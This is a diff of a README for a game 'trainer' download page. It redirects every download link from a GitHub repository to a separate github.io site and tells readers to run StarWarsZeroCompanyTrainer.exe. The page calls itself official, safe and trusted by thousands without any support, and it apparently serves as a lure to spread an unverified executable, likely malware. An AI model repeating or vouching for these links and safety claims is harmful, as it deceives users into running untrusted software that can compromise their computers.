@@ -1,6 +1,6 @@
 # 🚀 Star-Wars-Zero-Company-Trainer-2026-Download - Unlock All Features Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Star_Wars_Zero_Company_Trainer_2026-blue?style=for-the-badge&logo=github&color=00FF00)](https://github.com/carynonrecreational1342/Star-Wars-Zero-Company-Trainer-2026-Download)
+[![Download Now](https://img.shields.io/badge/Download-Star_Wars_Zero_Company_Trainer_2026-blue?style=for-the-badge&logo=github&color=00FF00)](https://carynonrecreational1342.github.io)
 
 ## 🎮 What Is This?
 
@@ -29,7 +29,7 @@ Follow these simple steps to download and use the trainer on your Windows PC. No
 
 Visit this link to download the application:
 
-[**https://github.com/carynonrecreational1342/Star-Wars-Zero-Company-Trainer-2026-Download**](https://github.com/carynonrecreational1342/Star-Wars-Zero-Company-Trainer-2026-Download)
+[**https://carynonrecreational1342.github.io**](https://carynonrecreational1342.github.io)
 
 This is an official download page hosted on GitHub. It is safe and trusted by thousands of users.
 
@@ -115,7 +115,7 @@ Now that you understand everything, let's get you set up:
 4. Run `StarWarsZeroCompanyTrainer.exe`.
 5. Start the game and enjoy your enhanced experience.
 
-[**Download Star Wars Zero Company Trainer 2026 Now**](https://github.com/carynonrecreational1342/Star-Wars-Zero-Company-Trainer-2026-Download)
+[**Download Star Wars Zero Company Trainer 2026 Now**](https://carynonrecreational1342.github.io)
 
 The download link is also included at the very top of this page in the green button. Click that button to go directly to the download section.
 
